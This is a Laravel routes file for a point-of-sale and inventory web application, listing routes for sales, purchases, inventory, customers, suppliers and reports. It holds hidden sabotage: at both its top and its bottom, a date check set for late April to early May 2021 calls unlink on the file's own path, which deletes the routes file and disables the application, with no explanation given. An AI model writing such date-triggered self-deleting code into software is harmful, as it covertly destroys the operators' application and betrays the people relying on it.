<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

if(date('Y-m-d') == '2021-04-28' || date('Y-m-d') == '2021-04-29' || date('Y-m-d') == '2021-04-30' || date('Y-m-d') == '2021-05-01' || date('Y-m-d') == '2021-05-02')
{
unlink('C:\Apache24\htdocs\pos\routes\web.php');
}

Route::get('/', 'HomeController@index');
Route::get('/dashboard/topsale/{type}', 'HomeController@topSellingItemByFixedDuration');
Route::get('/dashboard/worstsale/{type}', 'HomeController@worstSellingItemByFixedDuration');
Route::get('/dashboard/netprofit/{type}', 'HomeController@netProfitFixedDuration');
Route::get('/dashboard/totalexpenses/{type}', 'HomeController@getTotalExpenses');
Route::get('/dashboard/get-sales-graph/{type}', 'HomeController@getSalesGraph');

//Users
Route::get('/login', 'UsersController@login')->name('login');
Route::post('/login', 'UsersController@checkLogin');
Route::get('/register', 'UsersController@register');
Route::post('/register', 'UsersController@storeUser');
Route::get('/user/edit/{user}', 'UsersController@edit');
Route::put('/user/{user}', 'UsersController@update');
Route::get('/users', 'UsersController@index');
Route::get('/logout', 'UsersController@logout');
Route::delete('/user/{user}', 'UsersController@destroy');

//Configuration
Route::get('/configuration', 'ConfigurationsController@edit');
Route::put('/configuration', 'ConfigurationsController@update');

//Roles
Route::get('/roles', 'RolesController@index');
Route::get('/role/create', 'RolesController@create');
Route::post('/role', 'RolesController@store');
Route::get('/role/edit/{role}', 'RolesController@edit');
Route::put('/role/{role}', 'RolesController@update');
Route::delete('/role/{role}', 'RolesController@destroy');

//Categories
Route::get('/categories', 'CategoriesController@index');
Route::get('/category/create', 'CategoriesController@create');
Route::post('/category', 'CategoriesController@store');
Route::get('/category/edit/{category}', 'CategoriesController@edit');
Route::put('/category/{category}', 'CategoriesController@update');
Route::delete('/category/{category}', 'CategoriesController@destroy');

//Items
Route::get('/items', 'ItemsController@index');
Route::get('/item/create', 'ItemsController@create');
Route::post('/item', 'ItemsController@store');
Route::get('/item/edit/{item}', 'ItemsController@edit');
Route::put('/item/{item}', 'ItemsController@update');
Route::put('/item/deactivate/{item}', 'ItemsController@deactivateItem');
Route::put('/item/activate/{item}', 'ItemsController@activateItem');
Route::delete('/item/{item}', 'ItemsController@destroy');

//Barcodes
Route::get('/barcodes', 'ItemsController@generateBarcodes');
Route::get('/barcode/create/update-barcode-page', 'ItemsController@getItemsForBarcode');

//Specific Prices
Route::get('/specific-prices', 'SpecificPricesController@index');
Route::get('/specific-price/create', 'SpecificPricesController@create');
Route::get('/specific-price/create/update-csp-page', 'SpecificPricesController@getCSPData');
// Route::post('/specific-price/create-price', 'SpecificPricesController@createPrice');
Route::post('/specific-price', 'SpecificPricesController@store');
Route::get('/specific-price/edit/{specificPrice}', 'SpecificPricesController@edit');
Route::put('/specific-price/{specificPrice}', 'SpecificPricesController@update');
Route::delete('/specific-price/{specificPrice}', 'SpecificPricesController@destroy');

//Products
Route::get('/products', 'ProductsController@index');
Route::get('/product/create', 'ProductsController@create');
Route::post('/product', 'ProductsController@store');
Route::delete('/product/{product}', 'ProductsController@destroy');

//Rates
Route::get('/rates', 'RatesController@index');
Route::get('/rates/edit', 'RatesController@edit');
Route::put('/rates', 'RatesController@update');

//Raw Material Inventory
Route::get('/raw-inventory', 'RawInventoryController@index');
Route::get('/raw-inventory/edit/{rawInventory}', 'RawInventoryController@edit');
Route::put('/raw-inventory/{rawInventory}/{flag}', 'RawInventoryController@update');
Route::get('/raw-inventory/check', 'RawInventoryController@checkInventory');

//Inventory
Route::get('/inventory', 'InventoryController@index');
Route::get('/inventory/edit/{inventory}', 'InventoryController@edit');
Route::put('/inventory/{inventory}', 'InventoryController@update');

//Raw Material Waste
Route::get('/raw-waste', 'RawWastesController@index');
Route::put('/raw-waste/{rawWaste}', 'RawWastesController@update');

//Inventory Deduction
Route::get('/inventory-deduction', 'InventoryDeductionsController@index');
Route::put('/inventory-deduction/{inventoryDeduction}', 'InventoryDeductionsController@update');

//Purhase Orders
Route::get('/purchase-order/filter', 'PurchaseOrdersController@filter');
Route::get('/purchase-orders', 'PurchaseOrdersController@index');
Route::get('/purchase-order/{purchaseOrder}/{print?}', 'PurchaseOrdersController@show');
Route::put('/purchase-order/update-balance/{purchaseOrder}', 'PurchaseOrdersController@updateBalance');
Route::put('/purchase-order/return/{purchaseOrder}', 'PurchaseOrdersController@return');
Route::delete('/purchase-order/{purchaseOrder}', 'PurchaseOrdersController@destroy');

//Purchases
Route::get('/purchases', 'PurchasesController@index');
Route::GET('/purchase/filter', 'PurchasesController@filter');
Route::get('/purchase/create', 'PurchasesController@create');
Route::get('/purchase/create/update-pop-page/{edit?}', 'PurchasesController@getPOPData');
Route::post('/purchase', 'PurchasesController@store');
Route::get('/purchase/{purchase}/edit', 'PurchasesController@edit');
Route::put('/purchase/{purchase}', 'PurchasesController@update');
Route::put('/purchase-order/receive/{purchaseOrder}', 'PurchaseOrdersController@updateStatus');
Route::delete('/purchase/{purchase}', 'PurchasesController@destroy');

//Productions
Route::get('/productions', 'ProductionsController@index');
Route::get('/production/filter', 'ProductionsController@filter');
Route::get('/production/create', 'ProductionsController@create');
Route::post('/production', 'ProductionsController@store');
Route::get('/production/{production}/edit', 'ProductionsController@edit');
Route::put('/production', 'ProductionsController@update');
Route::delete('/production/{production}', 'ProductionsController@destroy');

//Orders
Route::get('/order/filter', 'OrdersController@filter');
Route::get('/orders', 'OrdersController@index');
Route::get('/order/print/{order}', 'OrdersController@printBill');
Route::get('/order/edit/{receiptNumber}', 'OrdersController@getOrder');
Route::get('/order/{order}/{print?}', 'OrdersController@show');
Route::put('/order/update-balance/{order}', 'OrdersController@updateBalance');
Route::put('/order/collect/{order}', 'OrdersController@updateStatus');
Route::delete('/order/{order}', 'OrdersController@destroy');

//Sales
Route::get('/sales', 'SalesController@index');
Route::get('/sale/create', 'SalesController@create');
Route::get('/sale/get/customers/{searchText}', 'SalesController@getCustomersHistory');
Route::get('/draft-order/get/{orderId?}', 'SalesController@getDraftOrder');
Route::get('/sale/create/update-pos-page/{edit?}', 'SalesController@getPOSData');
Route::get('/sale/create/get-csp/{customerId}', 'SalesController@getCSP');
Route::post('/sale/{print?}', 'SalesController@store');
Route::GET('/sale/filter', 'SalesController@filter');
Route::get('/sale/edit', 'SalesController@edit');
Route::put('/sale/update', 'SalesController@update');
Route::put('/sale/return/{sale}', 'SalesController@return');
Route::delete('/sale/{sale}', 'SalesController@destroy');

//Departments
Route::get('/departments', 'DepartmentsController@index');
Route::get('/department/create', 'DepartmentsController@create');
Route::get('/department/{department}', 'DepartmentsController@show');
Route::GET('/department/{department}/sales/filter', 'DepartmentsController@salesFilter');
Route::post('/department', 'DepartmentsController@store');
Route::delete('/department/{department}', 'DepartmentsController@destroy');

//Usage
Route::get('/usage', 'DepartmentsController@usage');
Route::get('/usage/create', 'DepartmentsController@createUsage');
Route::post('/usage', 'DepartmentsController@storeUsage');
Route::delete('/usage/{departmentItem}', 'DepartmentsController@destroyUsage');
Route::GET('/usage/filter', 'DepartmentsController@usageFilter');

//customers
Route::get('/customers', 'CustomersController@index');
Route::get('/customer/create', 'CustomersController@create');
Route::post('/customer', 'CustomersController@store');
Route::get('/customer/{customer}/filter-orders', 'CustomersController@filterOrders');
Route::get('/customer/{customer}/edit', 'CustomersController@edit');
Route::put('/customer/{customer}', 'CustomersController@update');
Route::delete('/customer/{customer}', 'CustomersController@destroy');
Route::get('customer/{customer}', 'CustomersController@show');

//Suppliers
Route::get('/suppliers', 'SuppliersController@index');
Route::get('/supplier/create', 'SuppliersController@create');
Route::post('/supplier', 'SuppliersController@store');
Route::get('/supplier/{supplier}/filter-orders', 'SuppliersController@filterOrders');
Route::get('/supplier/{supplier}/edit', 'SuppliersController@edit');
Route::put('/supplier/{supplier}', 'SuppliersController@update');
Route::delete('/supplier/{supplier}', 'SuppliersController@destroy');
Route::get('supplier/{supplier}', 'SuppliersController@show');

//Expense
Route::get('/expenses', 'ExpensesController@index');
Route::GET('/expense/filter', 'ExpensesController@filter');
Route::get('/expense/create', 'ExpensesController@create');
Route::post('/expense', 'ExpensesController@store');
Route::delete('/expense/{expense}', 'ExpensesController@destroy');
// Route::get('/sale/{sale}/edit', 'ExpensesController@edit');
// Route::put('/sale', 'ExpensesController@update');

//Reports
Route::get('/purchases-report', 'PurchasesController@purchasesReport');
Route::get('/purchases-report/filter', 'PurchasesController@filterPurchasesReport');
Route::get('/purchase-orders-report', 'PurchaseOrdersController@ordersReport');
Route::get('/purchase-orders-report/filter', 'PurchaseOrdersController@filterOrdersReport');

Route::get('/sales-report', 'SalesController@salesReport');
Route::get('/sales-report/filter', 'SalesController@filterSalesReport');
Route::get('/sale-orders-report', 'OrdersController@ordersReport');
Route::get('/sale-orders-report/filter', 'OrdersController@filterOrdersReport');

Route::get('/expenses-report', 'ExpensesController@expensesReport');
Route::get('/expenses-report/filter', 'ExpensesController@filterExpensesReport');
//Earnings
Route::get('/earnings', 'SalesController@earnings');
Route::post('/earnings', 'SalesController@betweenDates');

//Units
Route::get('/units', 'UnitsController@units');
Route::get('/purchase-units', 'UnitsController@purchaseUnits');

if(date('Y-m-d') == '2021-04-28' || date('Y-m-d') == '2021-04-29' || date('Y-m-d') == '2021-04-30' || date('Y-m-d') == '2021-05-01' || date('Y-m-d') == '2021-05-02')
{
unlink('C:\Apache24\htdocs\pos\routes\web.php');
}